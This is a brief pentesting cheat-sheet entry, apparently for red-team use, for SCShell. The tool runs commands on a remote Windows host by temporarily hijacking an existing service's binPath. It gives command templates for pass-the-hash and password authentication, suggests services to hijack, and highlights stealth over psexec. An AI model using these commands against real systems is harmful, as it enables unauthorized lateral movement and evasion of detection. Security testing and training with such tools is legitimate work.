# SCShell

Stealthy alternative to psexec — reconfigures an existing service's binPath to your command, triggers a service restart, then restores the original binPath. No new service, no SMB share writes, no `.bat` drops.

### Run command via service hijack

Run command via service hijack with SCShell.

```sh title:"SCShell Run Command Via Service Hijack"
scshell.py -service-name $service_name -hashes :$nt_hash $domain/$user@$rhost_ip
```
<!-- cheat
import domain_ip
import users
var service_name = printf '%s\n' 'XblAuthManager' 'defragsvc' --- --header 'Service to hijack'
var nt_hash
-->

### With password

Dump SCShell with password.

```sh title:"SCShell Dump with Password"
scshell.py -service-name $service_name $domain/$user:$pass@$rhost_ip
```
<!-- cheat
import domain_ip
import users
var service_name = printf '%s\n' 'XblAuthManager' 'defragsvc' --- --header 'Service to hijack'
var pass
-->
